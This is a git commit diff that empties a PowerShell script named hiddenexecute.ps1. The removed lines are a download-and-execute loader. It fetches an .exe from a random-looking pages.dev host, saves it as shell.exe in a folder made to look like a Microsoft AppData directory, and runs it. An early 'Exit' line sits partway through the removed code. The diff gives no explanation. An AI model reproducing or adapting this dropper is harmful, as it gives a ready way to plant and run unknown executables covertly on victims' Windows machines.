da4407ec5baed599bcb0cb9512aebd029885524b
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-20 17:45:13 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,13 +1,1 @@
-$url = "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/files/windowspackages.exe"
-$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsPackages"
-$localPath = "$folderPath\shell.exe"
-Exit
-if (-Not (Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath
-}
 
-if (-Not (Test-Path $localPath)) {
-    Invoke-WebRequest -Uri $url -OutFile $localPath
-}
-
-Start-Process $localPath
